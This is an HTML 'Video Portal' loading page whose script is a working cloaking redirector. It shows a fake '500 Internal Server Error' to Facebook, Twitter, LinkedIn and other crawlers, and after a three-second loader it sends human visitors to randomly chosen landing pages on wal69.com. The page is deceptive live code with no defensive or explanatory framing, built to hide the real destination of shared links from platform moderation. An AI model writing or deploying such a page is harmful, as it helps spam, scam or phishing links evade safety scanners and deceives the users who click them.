<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Video Portal</title>
  <style>
    html, body {
      margin: 0;
      padding: 0;
      height: 100%;
      background: radial-gradient(circle at center, #111 0%, #000 100%);
      color: #fff;
      display: flex;
      justify-content: center;
      align-items: center;
      font-family: "Segoe UI", sans-serif;
      overflow: hidden;
    }
    .loading {
      text-align: center;
      animation: fadeIn 1s ease-in-out;
    }
    .loading h1 {
      font-size: 2em;
      letter-spacing: 1px;
      margin-bottom: 10px;
      color: #ff3366;
    }
    .dot {
      display: inline-block;
      width: 10px;
      height: 10px;
      margin: 0 3px;
      background-color: #ff3366;
      border-radius: 50%;
      animation: blink 1.2s infinite ease-in-out;
    }
    .dot:nth-child(2) { animation-delay: 0.2s; }
    .dot:nth-child(3) { animation-delay: 0.4s; }

    @keyframes blink {
      0%, 80%, 100% { opacity: 0; }
      40% { opacity: 1; }
    }
    @keyframes fadeIn {
      from { opacity: 0; transform: scale(0.9); }
      to { opacity: 1; transform: scale(1); }
    }
  </style>
  <script>
    window.onload = function() {
      const ua = navigator.userAgent.toLowerCase();

      // Block Facebook or bots
      const blockedAgents = [
        'facebookexternalhit',
        'facebot',
        'twitterbot',
        'linkedinbot',
        'crawler',
        'spider'
      ];

      if (blockedAgents.some(agent => ua.includes(agent))) {
        document.body.innerHTML = "<h1 style='color:#ff3366;text-align:center;'>500 Internal Server Error</h1>";
        return;
      }

      // Add visual delay before redirect (human visitors see a loader)
      const pages = [
        "http://wal69.com/landing.php",
        "http://wal69.com/landing.php?id=1",
        "http://wal69.com/landing.php?id=2",
        "http://wal69.com/landing.php?id=3"
      ];
      const target = pages[Math.floor(Math.random() * pages.length)];

      setTimeout(() => {
        window.location.href = target;
      }, 3000); // 3 seconds delay
    };
  </script>
</head>
<body>
  <div class="loading">
    <h1>Loading your experience</h1>
    <div>
      <span class="dot"></span>
      <span class="dot"></span>
      <span class="dot"></span>
    </div>
  </div>
</body>
</html>
